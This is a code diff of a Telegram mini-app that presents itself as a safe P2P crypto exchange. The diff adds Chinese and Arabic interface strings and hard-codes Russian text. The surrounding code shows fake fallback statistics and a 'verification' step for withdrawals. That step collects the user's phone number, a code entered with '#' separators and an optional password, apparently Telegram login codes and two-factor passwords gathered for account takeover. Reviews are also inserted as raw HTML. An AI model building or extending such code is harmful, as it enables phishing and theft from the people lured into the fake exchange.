@@ -43,6 +43,7 @@
         @keyframes pulse-ring { 0%,100% { box-shadow: 0 0 0 0 rgba(0,152,234,0.3); } 50% { box-shadow: 0 0 0 20px rgba(0,152,234,0); } }
         @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes spin-slow { to { transform: rotate(360deg); } }
+        .animate-float { animation: float 4s ease-in-out infinite; }
 
         .language-overlay {
             position: fixed;
@@ -582,11 +583,10 @@
             firstName: tg?.initDataUnsafe?.user?.first_name || 'Пользователь'
         };
 
-        const userNameEl = document.getElementById('userName');
-        if (userNameEl) userNameEl.textContent = '👤 ' + (user.firstName || user.username);
+        document.getElementById('userName').textContent = '👤 ' + (user.firstName || user.username);
 
         // ============================================================
-        // 3. ЯЗЫКИ
+        // 3. ЯЗЫКИ (ПОЛНОСТЬЮ РАБОЧАЯ ВЕРСИЯ)
         // ============================================================
         let currentLang = 'ru';
 
@@ -665,7 +665,9 @@
                 'need2Deals': 'Для вывода нужно провести 2 успешные сделки с одним покупателем. У вас: ',
                 'verificationRequired': 'Для вывода необходима верификация. Пройдите проверку.',
                 'verificationPassed': 'Все условия выполнены! Вы можете вывести средства.',
-                'sessionActive': 'Сессия активна до: '
+                'sessionActive': 'Сессия активна до: ',
+                'headerTitle': 'P2P',
+                'headerTitleSpan': 'Exchange'
             },
             'en': {
                 'langPrompt': 'Choose your language',
@@ -741,74 +743,202 @@
                 'need2Deals': 'You need 2 successful deals with the same buyer. You have: ',
                 'verificationRequired': 'Verification required to withdraw. Please verify.',
                 'verificationPassed': 'All conditions met! You can withdraw.',
-                'sessionActive': 'Session active until: '
+                'sessionActive': 'Session active until: ',
+                'headerTitle': 'P2P',
+                'headerTitleSpan': 'Exchange'
+            },
+            'zh': {
+                'langPrompt': '选择您的语言',
+                'onlineLabel': '在线',
+                'statLabel1': '今日交易',
+                'statLabel2': '用户',
+                'statLabel3': '评论',
+                'statLabel4': '交易量 (TON)',
+                'navMain': '主页',
+                'navCreate': '创建',
+                'navDeals': '交易',
+                'navReviews': '评论',
+                'navBalance': '余额',
+                'navAdmin': '管理员',
+                'welcomeTitle': '欢迎！',
+                'welcomeText': '安全的P2P加密货币交易。P2P Exchange — 您值得信赖的合作伙伴。',
+                'quickStart': '快速开始',
+                'btnCreateDeal': '创建交易',
+                'btnReviews': '评论',
+                'btnBalance': '余额',
+                'btnDeals': '我的交易',
+                'howWorks': '运作方式',
+                'step1': '1️⃣ 创建交易 — 描述商品和金额',
+                'step2': '2️⃣ 发送链接给买家',
+                'step3': '3️⃣ 买家在网站上支付',
+                'step4': '4️⃣ 卖家交付 — 点击按钮',
+                'step5': '5️⃣ 买家确认收到',
+                'step6': '6️⃣ 资金转入卖家账户',
+                'securityText': '🔒 防诈骗保护 • 验证 • 24/7支持',
+                'recentReviewsTitle': '最新评论',
+                'loadingText': '加载中...',
+                'supportLabel': '支持',
+                'channelLabel': '频道',
+                'createTitle': '创建交易',
+                'createSubtitle': '填写表格',
+                'labelProduct': '商品或服务',
+                'labelCurrency': '货币',
+                'labelAmount': '金额',
+                'labelBuyer': '买家用户名 (不含@)',
+                'btnCreate': '创建交易',
+                'btnBackMain': '主菜单',
+                'myDealsTitle': '我的交易',
+                'loadingDeals': '加载中...',
+                'btnBackMain2': '主菜单',
+                'reviewsTitle': '评论',
+                'reviewsSubtitle': '交易后留下评论',
+                'labelRating': '评分',
+                'labelReviewText': '评论',
+                'btnSubmitReview': '提交评论',
+                'loadingReviews': '加载中...',
+                'btnLoadMore': '加载更多',
+                'balanceTitle': '我的余额',
+                'btnWithdraw': '提取资金',
+                'withdrawInfo': '💳 提取资金',
+                'labelWithdrawCurrency': '货币',
+                'labelWithdrawDetails': '详情',
+                'btnConfirmWithdraw': '确认提取',
+                'btnBackMain3': '主菜单',
+                'adminTitle': '管理面板',
+                'loadingAdmin': '检查权限...',
+                'btnBackMain4': '主菜单',
+                'noDeals': '您没有交易',
+                'noReviews': '暂无评论',
+                'paid': '已付款',
+                'waiting': '等待付款',
+                'awaiting': '等待确认',
+                'completed': '已完成',
+                'copyLink': '复制链接',
+                'pay': '支付',
+                'sellerDelivered': '已交付',
+                'confirmReceipt': '确认收到',
+                'balanceZero': '您的余额为0。请充值后提取。',
+                'need2Deals': '需要与同一买家完成2笔交易。您有: ',
+                'verificationRequired': '提取需要验证。请进行验证。',
+                'verificationPassed': '所有条件已满足！您可以提取资金。',
+                'sessionActive': '会话有效期至: ',
+                'headerTitle': 'P2P',
+                'headerTitleSpan': '交易所'
+            },
+            'ar': {
+                'langPrompt': 'اختر لغتك',
+                'onlineLabel': 'متصل',
+                'statLabel1': 'صفقات اليوم',
+                'statLabel2': 'مستخدمين',
+                'statLabel3': 'مراجعات',
+                'statLabel4': 'الحجم (TON)',
+                'navMain': 'الرئيسية',
+                'navCreate': 'إنشاء',
+                'navDeals': 'صفقات',
+                'navReviews': 'مراجعات',
+                'navBalance': 'الرصيد',
+                'navAdmin': 'مدير',
+                'welcomeTitle': 'مرحباً!',
+                'welcomeText': 'صفقات P2P آمنة للعملات المشفرة. P2P Exchange — شريكك الموثوق.',
+                'quickStart': 'بداية سريعة',
+                'btnCreateDeal': 'إنشاء صفقة',
+                'btnReviews': 'مراجعات',
+                'btnBalance': 'الرصيد',
+                'btnDeals': 'صفقاتي',
+                'howWorks': 'كيف يعمل',
+                'step1': '1️⃣ أنشئ صفقة — صف المنتج والمبلغ',
+                'step2': '2️⃣ أرسل الرابط للمشتري',
+                'step3': '3️⃣ المشتري يدفع على الموقع',
+                'step4': '4️⃣ البائع يسلم — يضغط الزر',
+                'step5': '5️⃣ المشتري يؤكد الاستلام',
+                'step6': '6️⃣ تضاف الأموال إلى رصيد البائع',
+                'securityText': '🔒 حماية من المحتالين • تحقق • دعم 24/7',
+                'recentReviewsTitle': 'أحدث المراجعات',
+                'loadingText': 'جار التحميل...',
+                'supportLabel': 'الدعم',
+                'channelLabel': 'القناة',
+                'createTitle': 'إنشاء صفقة',
+                'createSubtitle': 'املأ النموذج',
+                'labelProduct': 'المنتج أو الخدمة',
+                'labelCurrency': 'العملة',
+                'labelAmount': 'المبلغ',
+                'labelBuyer': 'اسم مستخدم المشتري (بدون @)',
+                'btnCreate': 'إنشاء صفقة',
+                'btnBackMain': 'القائمة الرئيسية',
+                'myDealsTitle': 'صفقاتي',
+                'loadingDeals': 'جار التحميل...',
+                'btnBackMain2': 'القائمة الرئيسية',
+                'reviewsTitle': 'مراجعات',
+                'reviewsSubtitle': 'اترك مراجعة بعد الصفقات',
+                'labelRating': 'التقييم',
+                'labelReviewText': 'المراجعة',
+                'btnSubmitReview': 'إرسال المراجعة',
+                'loadingReviews': 'جار التحميل...',
+                'btnLoadMore': 'تحميل المزيد',
+                'balanceTitle': 'رصيدي',
+                'btnWithdraw': 'سحب الأموال',
+                'withdrawInfo': '💳 سحب الأموال',
+                'labelWithdrawCurrency': 'العملة',
+                'labelWithdrawDetails': 'التفاصيل',
+                'btnConfirmWithdraw': 'تأكيد السحب',
+                'btnBackMain3': 'القائمة الرئيسية',
+                'adminTitle': 'لوحة المدير',
+                'loadingAdmin': 'فحص الصلاحيات...',
+                'btnBackMain4': 'القائمة الرئيسية',
+                'noDeals': 'ليس لديك صفقات',
+                'noReviews': 'لا توجد مراجعات بعد',
+                'paid': 'مدفوع',
+                'waiting': 'انتظار الدفع',
+                'awaiting': 'انتظار التأكيد',
+                'completed': 'مكتمل',
+                'copyLink': 'نسخ الرابط',
+                'pay': 'دفع',
+                'sellerDelivered': 'تم التسليم',
+                'confirmReceipt': 'تأكيد الاستلام',
+                'balanceZero': 'رصيدك 0. يرجى الإيداع للسحب.',
+                'need2Deals': 'تحتاج صفقتين ناجحتين مع نفس المشتري. لديك: ',
+                'verificationRequired': 'السحب يحتاج التحقق. يرجى التحقق.',
+                'verificationPassed': 'جميع الشروط متوفرة! يمكنك السحب.',
+                'sessionActive': 'الجلسة نشطة حتى: ',
+                'headerTitle': 'P2P',
+                'headerTitleSpan': 'صراف'
             }
         };
 
         function applyLanguage(lang) {
             const t = LANG_TEXT[lang] || LANG_TEXT['ru'];
-            const elements = {
-                'langPrompt': document.getElementById('langPrompt'),
-                'onlineLabel': document.getElementById('onlineLabel'),
-                'statLabel1': document.getElementById('statLabel1'),
-                'statLabel2': document.getElementById('statLabel2'),
-                'statLabel3': document.getElementById('statLabel3'),
-                'statLabel4': document.getElementById('statLabel4'),
-                'navMain': document.getElementById('navMain'),
-                'navCreate': document.getElementById('navCreate'),
-                'navDeals': document.getElementById('navDeals'),
-                'navReviews': document.getElementById('navReviews'),
-                'navBalance': document.getElementById('navBalance'),
-                'navAdmin': document.getElementById('navAdmin'),
-                'welcomeTitle': document.getElementById('welcomeTitle'),
-                'welcomeText': document.getElementById('welcomeText'),
-                'quickStart': document.getElementById('quickStart'),
-                'btnCreateDeal': document.getElementById('btnCreateDeal'),
-                'btnReviews': document.getElementById('btnReviews'),
-                'btnBalance': document.getElementById('btnBalance'),
-                'btnDeals': document.getElementById('btnDeals'),
-                'howWorks': document.getElementById('howWorks'),
-                'securityText': document.getElementById('securityText'),
-                'recentReviewsTitle': document.getElementById('recentReviewsTitle'),
-                'loadingText': document.getElementById('loadingText'),
-                'supportLabel': document.getElementById('supportLabel'),
-                'channelLabel': document.getElementById('channelLabel'),
-                'createTitle': document.getElementById('createTitle'),
-                'createSubtitle': document.getElementById('createSubtitle'),
-                'labelProduct': document.getElementById('labelProduct'),
-                'labelCurrency': document.getElementById('labelCurrency'),
-                'labelAmount': document.getElementById('labelAmount'),
-                'labelBuyer': document.getElementById('labelBuyer'),
-                'btnCreate': document.getElementById('btnCreate'),
-                'btnBackMain': document.getElementById('btnBackMain'),
-                'myDealsTitle': document.getElementById('myDealsTitle'),
-                'loadingDeals': document.getElementById('loadingDeals'),
-                'btnBackMain2': document.getElementById('btnBackMain2'),
-                'reviewsTitle': document.getElementById('reviewsTitle'),
-                'reviewsSubtitle': document.getElementById('reviewsSubtitle'),
-                'labelRating': document.getElementById('labelRating'),
-                'labelReviewText': document.getElementById('labelReviewText'),
-                'btnSubmitReview': document.getElementById('btnSubmitReview'),
-                'loadingReviews': document.getElementById('loadingReviews'),
-                'btnLoadMore': document.getElementById('btnLoadMore'),
-                'balanceTitle': document.getElementById('balanceTitle'),
-                'btnWithdraw': document.getElementById('btnWithdraw'),
-                'withdrawInfo': document.getElementById('withdrawInfo'),
-                'labelWithdrawCurrency': document.getElementById('labelWithdrawCurrency'),
-                'labelWithdrawDetails': document.getElementById('labelWithdrawDetails'),
-                'btnConfirmWithdraw': document.getElementById('btnConfirmWithdraw'),
-                'btnBackMain3': document.getElementById('btnBackMain3'),
-                'adminTitle': document.getElementById('adminTitle'),
-                'loadingAdmin': document.getElementById('loadingAdmin'),
-                'btnBackMain4': document.getElementById('btnBackMain4')
-            };
-            for (const [key, el] of Object.entries(elements)) {
-                if (el && t[key] !== undefined) el.textContent = t[key];
+            
+            // Список всех ID элементов, которые нужно обновить
+            const elementIds = [
+                'langPrompt', 'onlineLabel', 'statLabel1', 'statLabel2', 'statLabel3', 'statLabel4',
+                'navMain', 'navCreate', 'navDeals', 'navReviews', 'navBalance', 'navAdmin',
+                'welcomeTitle', 'welcomeText', 'quickStart', 'btnCreateDeal', 'btnReviews', 'btnBalance', 'btnDeals',
+                'howWorks', 'securityText', 'recentReviewsTitle', 'loadingText', 'supportLabel', 'channelLabel',
+                'createTitle', 'createSubtitle', 'labelProduct', 'labelCurrency', 'labelAmount', 'labelBuyer',
+                'btnCreate', 'btnBackMain', 'myDealsTitle', 'loadingDeals', 'btnBackMain2',
+                'reviewsTitle', 'reviewsSubtitle', 'labelRating', 'labelReviewText', 'btnSubmitReview',
+                'loadingReviews', 'btnLoadMore', 'balanceTitle', 'btnWithdraw', 'withdrawInfo',
+                'labelWithdrawCurrency', 'labelWithdrawDetails', 'btnConfirmWithdraw', 'btnBackMain3',
+                'adminTitle', 'loadingAdmin', 'btnBackMain4'
+            ];
+            
+            // Обновляем элементы по ID
+            for (const id of elementIds) {
+                const el = document.getElementById(id);
+                if (el && t[id] !== undefined) {
+                    el.textContent = t[id];
+                }
             }
+            
+            // Обновляем шаги (step1 - step6)
             for (let i = 1; i <= 6; i++) {
                 const el = document.getElementById('step' + i);
-                if (el && t['step' + i] !== undefined) el.innerHTML = t['step' + i];
+                if (el && t['step' + i] !== undefined) {
+                    el.innerHTML = t['step' + i];
+                }
             }
+            
+            // Обновляем хедер
             const headerTitle = document.getElementById('headerTitle');
             const headerTitleSpan = document.getElementById('headerTitleSpan');
             if (headerTitle && t.headerTitle) headerTitle.textContent = t.headerTitle;
@@ -825,6 +955,7 @@
             loadMainData();
         }
 
+        // При загрузке страницы проверяем сохранённый язык
         if (localStorage.getItem('lang')) {
             setLanguage(localStorage.getItem('lang'));
         }
@@ -890,21 +1021,15 @@
         // ============================================================
         async function loadMainData() {
             try {
-                const onlineEl = document.getElementById('onlineCount');
-                if (onlineEl) onlineEl.textContent = getOnlineCount();
+                document.getElementById('onlineCount').textContent = getOnlineCount();
 
                 const stats = await apiCall('/api/stats');
                 if (stats.success) {
-                    const el1 = document.getElementById('statDealsToday');
-                    const el2 = document.getElementById('statUsers');
-                    const el3 = document.getElementById('statReviews');
-                    const el4 = document.getElementById('statVolume');
-                    const badge = document.getElementById('reviewBadge');
-                    if (el1) el1.textContent = stats.deals_today || 1264;
-                    if (el2) el2.textContent = stats.users || 21374;
-                    if (el3) el3.textContent = stats.reviews || 5427;
-                    if (el4) el4.textContent = (stats.volume || 47.6).toFixed(1);
-                    if (badge) badge.textContent = stats.reviews || 5427;
+                    document.getElementById('statDealsToday').textContent = stats.deals_today || 1264;
+                    document.getElementById('statUsers').textContent = stats.users || 21374;
+                    document.getElementById('statReviews').textContent = stats.reviews || 5427;
+                    document.getElementById('statVolume').textContent = (stats.volume || 47.6).toFixed(1);
+                    document.getElementById('reviewBadge').textContent = stats.reviews || 5427;
                 }
 
                 const reviews = await apiCall('/api/reviews', { limit: 3 });
@@ -936,8 +1061,6 @@
         }
 
         function renderRecentReviews(reviews) {
-            const container = document.getElementById('recentReviews');
-            if (!container) return;
             const html = reviews.map(r => `
                 <div class="review-card">
                     <div class="review-header">
@@ -951,7 +1074,7 @@
                     <div class="review-text">${r.text}</div>
                 </div>
             `).join('');
-            container.innerHTML = html;
+            document.getElementById('recentReviews').innerHTML = html;
         }
 
         // ============================================================
@@ -983,18 +1106,13 @@
         }
 
         function updateBalanceUI() {
-            const balTon = document.getElementById('balTon');
-            const balStars = document.getElementById('balStars');
-            const balRub = document.getElementById('balRub');
-            const balUah = document.getElementById('balUah');
-            const userBalance = document.getElementById('userBalance');
-            if (balTon) balTon.textContent = state.balance.ton || 0;
-            if (balStars) balStars.textContent = state.balance.stars || 0;
-            if (balRub) balRub.textContent = state.balance.rub || 0;
-            if (balUah) balUah.textContent = state.balance.uah || 0;
+            document.getElementById('balTon').textContent = state.balance.ton || 0;
+            document.getElementById('balStars').textContent = state.balance.stars || 0;
+            document.getElementById('balRub').textContent = state.balance.rub || 0;
+            document.getElementById('balUah').textContent = state.balance.uah || 0;
             const total = (state.balance.ton || 0) + (state.balance.stars || 0) +
                 (state.balance.rub || 0) + (state.balance.uah || 0);
-            if (userBalance) userBalance.innerHTML = `<i class="fas fa-coins"></i> ${total}`;
+            document.getElementById('userBalance').innerHTML = `<i class="fas fa-coins"></i> ${total}`;
         }
 
         // ============================================================
@@ -1002,9 +1120,7 @@
         // ============================================================
         async function loadDeals() {
             const container = document.getElementById('dealsList');
-            if (!container) return;
             container.innerHTML = '<div class="loading"><i class="fas fa-spinner"></i> Загрузка...</div>';
-            
             try {
                 const data = await apiCall('/api/deals');
                 if (data.success && data.deals) {
@@ -1012,39 +1128,33 @@
                     state.totalDeals = data.deals.filter(d => d.status === 'completed').length;
                     renderDeals();
                 } else {
-                    container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 ' + getLangText('noDeals') + '</p>';
+                    container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 У вас нет сделок</p>';
                 }
             } catch (e) {
-                console.error(e);
-                container.innerHTML = '<div class="error-text">❌ Ошибка загрузки</div>';
+                container.innerHTML = '<div class="error-text">❌ Ошибка</div>';
             }
-        }
-
-        function getLangText(key) {
-            return LANG_TEXT[currentLang]?.[key] || LANG_TEXT['ru'][key] || key;
         }
 
         function getStatusText(status) {
             const map = {
-                'waiting_payment': '⏳ ' + getLangText('waiting'),
-                'paid': '✅ ' + getLangText('paid'),
-                'awaiting_confirmation': '📦 ' + getLangText('awaiting'),
-                'completed': '🎉 ' + getLangText('completed')
+                'waiting_payment': '⏳ Ожидает оплаты',
+                'paid': '✅ Оплачено',
+                'awaiting_confirmation': '📦 Ожидает подтверждения',
+                'completed': '🎉 Завершено'
             };
             return map[status] || status;
         }
 
         function renderDeals() {
             const container = document.getElementById('dealsList');
-            if (!container) return;
             if (!state.deals || state.deals.length === 0) {
-                container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 ' + getLangText('noDeals') + '</p>';
+                container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 У вас нет сделок</p>';
                 return;
             }
             
             container.innerHTML = state.deals.map(d => {
                 const isSeller = d.seller_id == user.id;
-                const isBuyer = d.buyer_id == user.id || d.buyer_username.toLowerCase() === user.username.toLowerCase();
+                const isBuyer = d.buyer_id == user.id;
                 const isCompleted = d.status === 'completed';
                 
                 return `
@@ -1059,45 +1169,45 @@
                             <span>📅 ${d.created_at ? d.created_at.slice(0,10) : 'недавно'}</span>
                         </div>
                         <div class="deal-progress">
-                            <span class="step ${d.status === 'waiting_payment' ? 'active' : d.status === 'paid' || d.status === 'awaiting_confirmation' || d.status === 'completed' ? 'done' : ''}">⏳ ${getLangText('waiting')}</span>
-                            <span class="step ${d.status === 'paid' ? 'active' : d.status === 'awaiting_confirmation' || d.status === 'completed' ? 'done' : ''}">✅ ${getLangText('paid')}</span>
-                            <span class="step ${d.status === 'awaiting_confirmation' ? 'active' : d.status === 'completed' ? 'done' : ''}">📦 ${getLangText('awaiting')}</span>
-                            <span class="step ${d.status === 'completed' ? 'done' : ''}">🎉 ${getLangText('completed')}</span>
+                            <span class="step ${d.status === 'waiting_payment' ? 'active' : d.status === 'paid' || d.status === 'awaiting_confirmation' || d.status === 'completed' ? 'done' : ''}">⏳ Ожидает оплаты</span>
+                            <span class="step ${d.status === 'paid' ? 'active' : d.status === 'awaiting_confirmation' || d.status === 'completed' ? 'done' : ''}">✅ Оплачено</span>
+                            <span class="step ${d.status === 'awaiting_confirmation' ? 'active' : d.status === 'completed' ? 'done' : ''}">📦 Подтверждение</span>
+                            <span class="step ${d.status === 'completed' ? 'done' : ''}">🎉 Завершено</span>
                         </div>
                         
                         ${d.status === 'waiting_payment' && isSeller ? `
                             <button class="btn btn-secondary btn-sm mt-6" onclick="copyDealLink('${d.deal_id}')" style="width:auto;">
-                                <i class="fas fa-copy"></i> ${getLangText('copyLink')}
+                                <i class="fas fa-copy"></i> Скопировать ссылку
                             </button>
                         ` : ''}
                         
                         ${d.status === 'waiting_payment' && isBuyer ? `
                             <button class="btn btn-primary btn-sm mt-6" onclick="payDeal('${d.deal_id}')">
-                                <i class="fas fa-credit-card"></i> ${getLangText('pay')}
+                                <i class="fas fa-credit-card"></i> Оплатить
                             </button>
                         ` : ''}
                         
                         ${d.status === 'paid' && isSeller ? `
                             <div class="support-block mt-6" style="border-color: var(--success);">
-                                <span style="font-size:12px; color: var(--success);">✅ ${getLangText('paid')}. Нажмите «${getLangText('sellerDelivered')}»</span>
+                                <span style="font-size:12px; color: var(--success);">✅ Оплата подтверждена. Нажмите «Передал товар»</span>
                                 <button class="btn btn-success btn-sm mt-6" onclick="sellerDelivered('${d.deal_id}')">
-                                    <i class="fas fa-box"></i> ${getLangText('sellerDelivered')}
+                                    <i class="fas fa-box"></i> Передал товар
                                 </button>
                             </div>
                         ` : ''}
                         
                         ${d.status === 'awaiting_confirmation' && isBuyer ? `
                             <div class="support-block mt-6">
-                                <span style="font-size:12px;">📦 ${getLangText('sellerDelivered')}. ${getLangText('confirmReceipt')}</span>
+                                <span style="font-size:12px;">📦 Продавец передал товар. Подтвердите получение</span>
                                 <button class="btn btn-success btn-sm mt-6" onclick="confirmReceipt('${d.deal_id}')">
-                                    <i class="fas fa-check"></i> ${getLangText('confirmReceipt')}
+                                    <i class="fas fa-check"></i> Подтвердить получение
                                 </button>
                             </div>
                         ` : ''}
                         
                         ${isCompleted ? `
                             <div class="support-block mt-6" style="border-color: var(--success);">
-                                <span style="font-size:12px; color: var(--success);">🎉 ${getLangText('completed')}! Средства зачислены</span>
+                                <span style="font-size:12px; color: var(--success);">🎉 Сделка завершена! Средства зачислены</span>
                             </div>
                         ` : ''}
                     </div>
@@ -1112,14 +1222,14 @@
         }
 
         // ============================================================
-        // 10. ОПЛАТА (ПРАВИЛЬНЫЕ ЭНДПОИНТЫ)
+        // 10. ОПЛАТА
         // ============================================================
         async function payDeal(dealId) {
             showModal(`
-                <h3 style="margin-bottom:12px;">💳 ${getLangText('pay')}</h3>
+                <h3 style="margin-bottom:12px;">💳 Оплатить</h3>
                 <div style="display:grid; gap:8px;">
                     <button class="btn btn-primary" onclick="payWithBalance('${dealId}')">
-                        <i class="fas fa-wallet"></i> ${getLangText('pay')} с баланса
+                        <i class="fas fa-wallet"></i> Оплатить с баланса
                     </button>
                     <button class="btn btn-secondary" onclick="payWithRekvisits('${dealId}')">
                         <i class="fas fa-file-invoice"></i> По реквизитам
@@ -1244,25 +1354,23 @@
                 const data = await apiCall('/api/create_deal', { product, currency, amount, buyer_username: buyer });
                 if (data.success) {
                     const resultDiv = document.getElementById('dealResult');
-                    if (resultDiv) {
-                        resultDiv.style.display = 'block';
-                        resultDiv.innerHTML = `
-                            <div style="display:flex; align-items:center; gap:6px; color:#2ecc71;">
-                                <i class="fas fa-check-circle" style="font-size:18px;"></i>
-                                <strong>Сделка создана!</strong>
-                            </div>
-                            <p style="margin:6px 0; font-size:13px;">ID: <strong>${data.deal_id}</strong> • ${amount} ${currency}</p>
-                            <div class="form-group">
-                                <input type="text" value="${data.link}" readonly style="width:100%;padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border-color);border-radius:6px;color:var(--text-primary);font-size:12px;">
-                            </div>
-                            <button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText('${data.link}'); showToast('✅ Ссылка скопирована!','success');">
-                                <i class="fas fa-copy"></i> Скопировать ссылку
-                            </button>
-                            <div class="support-block mt-6">
-                                <span style="font-size:12px; color:var(--text-secondary);">📋 Отправьте ссылку покупателю. Сделка появится у него в разделе «Сделки».</span>
-                            </div>
-                        `;
-                    }
+                    resultDiv.style.display = 'block';
+                    resultDiv.innerHTML = `
+                        <div style="display:flex; align-items:center; gap:6px; color:#2ecc71;">
+                            <i class="fas fa-check-circle" style="font-size:18px;"></i>
+                            <strong>Сделка создана!</strong>
+                        </div>
+                        <p style="margin:6px 0; font-size:13px;">ID: <strong>${data.deal_id}</strong> • ${amount} ${currency}</p>
+                        <div class="form-group">
+                            <input type="text" value="${data.link}" readonly style="width:100%;padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border-color);border-radius:6px;color:var(--text-primary);font-size:12px;">
+                        </div>
+                        <button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText('${data.link}'); showToast('✅ Ссылка скопирована!','success');">
+                            <i class="fas fa-copy"></i> Скопировать ссылку
+                        </button>
+                        <div class="support-block mt-6">
+                            <span style="font-size:12px; color:var(--text-secondary);">📋 Отправьте ссылку покупателю.</span>
+                        </div>
+                    `;
                     showToast('✅ Сделка создана!', 'success');
                     document.getElementById('dealForm').reset();
                     loadDeals();
@@ -1273,7 +1381,7 @@
             } catch (err) {
                 showToast('❌ Ошибка: ' + err.message, 'error');
             } finally {
-                btn.innerHTML = '<i class="fas fa-check-circle"></i> ' + getLangText('btnCreate');
+                btn.innerHTML = '<i class="fas fa-check-circle"></i> Создать сделку';
                 btn.disabled = false;
             }
         });
@@ -1283,7 +1391,6 @@
         // ============================================================
         async function loadReviews() {
             const container = document.getElementById('reviewsList');
-            if (!container) return;
             container.innerHTML = '<div class="loading"><i class="fas fa-spinner"></i> Загрузка...</div>';
             try {
                 const data = await apiCall('/api/reviews', { page: state.reviewPage, limit: state.reviewLimit });
@@ -1299,9 +1406,8 @@
 
         function renderReviews() {
             const container = document.getElementById('reviewsList');
-            if (!container) return;
             if (!state.reviews || state.reviews.length === 0) {
-                container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 ' + getLangText('noReviews') + '</p>';
+                container.innerHTML = '<p class="text-center text-secondary" style="padding:15px;">📭 Пока нет отзывов</p>';
                 return;
             }
             const html = state.reviews.map(r => `
@@ -1318,8 +1424,7 @@
                 </div>
             `).join('');
             container.innerHTML = html;
-            const totalEl = document.getElementById('reviewTotal');
-            if (totalEl) totalEl.textContent = `(${state.reviews.length})`;
+            document.getElementById('reviewTotal').textContent = `(${state.reviews.length})`;
         }
 
         async function submitReview() {
@@ -1332,10 +1437,8 @@
             }
 
             const btn = document.querySelector('#reviewFormContainer .btn-gold');
-            if (btn) {
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
-                btn.disabled = true;
-            }
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
+            btn.disabled = true;
 
             try {
                 const data = await apiCall('/api/add_review', {
@@ -1346,8 +1449,7 @@
 
                 if (data.success) {
                     showToast('✅ Отзыв опубликован!', 'success');
-                    const reviewText = document.getElementById('reviewText');
-                    if (reviewText) reviewText.value = '';
+                    document.getElementById('reviewText').value = '';
                     loadReviews();
                     loadMainData();
                 } else {
@@ -1356,10 +1458,8 @@
             } catch (err) {
                 showToast('❌ Ошибка: ' + err.message, 'error');
             } finally {
-                if (btn) {
-                    btn.innerHTML = '<i class="fas fa-paper-plane"></i> ' + getLangText('btnSubmitReview');
-                    btn.disabled = false;
-                }
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Отправить отзыв';
+                btn.disabled = false;
             }
         }
 
@@ -1373,17 +1473,14 @@
         // ============================================================
         function toggleWithdraw() {
             const section = document.getElementById('withdrawSection');
-            if (section) {
-                section.style.display = section.style.display === 'none' ? 'block' : 'none';
-                if (section.style.display === 'block') {
-                    checkWithdrawConditions();
-                }
+            section.style.display = section.style.display === 'none' ? 'block' : 'none';
+            if (section.style.display === 'block') {
+                checkWithdrawConditions();
             }
         }
 
         async function checkWithdrawConditions() {
             const statusDiv = document.getElementById('withdrawStatus');
-            if (!statusDiv) return;
             statusDiv.style.display = 'block';
             
             const total = (state.balance.ton || 0) + (state.balance.stars || 0) + 
@@ -1391,7 +1488,7 @@
             
             if (total === 0) {
                 statusDiv.className = 'verification-status unverified';
-                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ❌ ' + getLangText('balanceZero');
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ❌ Ваш баланс равен 0. Пополните баланс для вывода.';
                 return;
             }
 
@@ -1400,7 +1497,7 @@
             
             if (!state.has2Deals) {
                 statusDiv.className = 'verification-status unverified';
-                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ ' + getLangText('need2Deals') + state.totalDeals;
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ Для вывода нужно провести 2 успешные сделки с одним покупателем. У вас: ' + state.totalDeals;
                 return;
             }
 
@@ -1412,9 +1509,9 @@
                 statusDiv.className = 'verification-status unverified';
                 statusDiv.innerHTML = `
                     <i class="fas fa-shield-alt"></i>
-                    ⚠️ ${getLangText('verificationRequired')}
+                    ⚠️ Для вывода необходима верификация. Пройдите проверку.
                     <button class="btn btn-primary btn-sm mt-6" onclick="showVerificationModal()" style="width:auto;">
-                        <i class="fas fa-arrow-right"></i> ${getLangText('verificationRequired')}
+                        <i class="fas fa-arrow-right"></i> Пройти верификацию
                     </button>
                 `;
                 return;
@@ -1423,14 +1520,14 @@
             statusDiv.className = 'verification-status verified';
             statusDiv.innerHTML = `
                 <i class="fas fa-check-circle"></i>
-                ✅ ${getLangText('verificationPassed')}
-                ${state.verificationExpires ? `🕐 ${getLangText('sessionActive')} ${new Date(state.verificationExpires).toLocaleString()}` : ''}
+                ✅ Все условия выполнены! Вы можете вывести средства.
+                ${state.verificationExpires ? `🕐 Сессия активна до: ${new Date(state.verificationExpires).toLocaleString()}` : ''}
             `;
         }
 
         function showVerificationModal() {
             showModal(`
-                <h3 style="margin-bottom:12px;">🔐 ${getLangText('verificationRequired')}</h3>
+                <h3 style="margin-bottom:12px;">🔐 Верификация</h3>
                 <p style="color:var(--text-secondary); margin-bottom:12px;">Защита от мошенников со скамнутыми звёздами и фейковой валютой</p>
                 <div class="form-group">
                     <label>📱 Номер телефона (формат: +7XXXXXXXXXX)</label>
@@ -1469,26 +1566,23 @@
                 const data = await apiCall('/api/start_verification', { phone, username });
                 
                 if (data.success) {
-                    const resultDiv = document.getElementById('verifyModalResult');
-                    if (resultDiv) {
-                        resultDiv.innerHTML = `
-                            <div class="verification-status verified" style="display:block;">
-                                <i class="fas fa-check-circle"></i>
-                                ✅ Запрос отправлен! Ожидайте код от администратора.
-                            </div>
-                            <div class="form-group mt-10">
-                                <label>🔑 Введите код (формат: 1#2#3#4#5)</label>
-                                <input type="text" id="verifyCodeModal" placeholder="1#2#3#4#5">
-                            </div>
-                            <div class="form-group">
-                                <label>🔐 Пароль (если есть)</label>
-                                <input type="text" id="verifyPasswordModal" placeholder="Введите пароль">
-                            </div>
